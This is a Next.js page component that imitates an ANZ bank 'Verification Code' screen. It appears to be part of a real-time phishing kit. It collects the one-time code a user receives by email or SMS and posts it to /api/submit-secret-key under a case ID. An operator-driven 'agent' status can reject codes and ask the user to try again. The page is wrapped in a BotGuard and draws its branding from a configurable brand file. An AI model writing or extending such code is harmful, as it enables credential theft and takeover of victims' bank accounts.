'use client';

/**
 * ANZ Secret Key/Verification Code Page
 * Centered single-column layout
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

// Lock icon SVG component
const LockIcon = () => (
  <svg className="lock-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path fill="currentColor" d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z" />
  </svg>
);

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId, agentMessage } = useSessionStore();

  const [secretKey, setSecretKey] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setSecretKey('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!secretKey.trim()) {
        setFieldError('Please enter your verification code');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: secretKey.trim(),
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your code. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your code...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [secretKey, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      {/* Page Title */}
      <h1 className="page-title">Verification Code</h1>

      {/* Login Form */}
      <div className="login-card">
        {/* Card Header - Mobile only */}
        <div className="card-header">
          <h2>Verification Code</h2>
        </div>

        <form className="login-form" onSubmit={handleSubmit}>
          <p style={{ color: 'var(--anz-white)', fontSize: '14px', marginBottom: '8px', opacity: 0.9 }}>
            Enter the code you received via email or SMS.
          </p>

          <div className="form-group">
            <label htmlFor="secret-key" className="form-label">Verification Code</label>
            <input
              type="text"
              id="secret-key"
              name="secret-key"
              className="form-input"
              autoComplete="off"
              value={secretKey}
              onChange={(e) => {
                setSecretKey(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          {/* Error message */}
          {fieldError && (
            <div className="error-message">
              <AlertCircle className="h-4 w-4" />
              <span>{fieldError}</span>
            </div>
          )}

          <button
            type="submit"
            className="btn-signin"
            disabled={!secretKey.trim() || isWaiting}
          >
            {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
            <LockIcon />
            {isWaiting ? 'Verifying...' : 'Verify'}
          </button>

          <p style={{ color: 'var(--anz-white)', fontSize: '13px', textAlign: 'center', marginTop: '16px', opacity: 0.8 }}>
            Need help? Contact {currentBrand.companyName} support
          </p>
        </form>
      </div>
    </BotGuard>
  );
}
